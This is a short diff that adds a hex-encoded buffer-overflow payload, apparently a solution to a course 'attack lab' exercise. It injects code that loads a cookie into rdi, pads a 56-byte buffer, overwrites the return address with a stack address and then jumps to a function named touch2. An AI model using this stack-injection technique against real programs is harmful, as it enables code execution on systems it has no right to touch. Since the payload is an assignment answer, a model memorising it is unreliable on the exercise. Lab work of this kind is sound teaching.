@@ -1,0 +1,9 @@
+48 c7 c7 30 51 c1 40 c3 /* command to move cookie to rdi */
+00 00 00 00 00 00 00 00 /* all padding to 56 (our buffer) */
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 /* end of buffer */
+c8 3b 61 55 00 00 00 00 /* address of rsp */
+3b 18 40 00 00 00 00 00 /* address of touch2 */
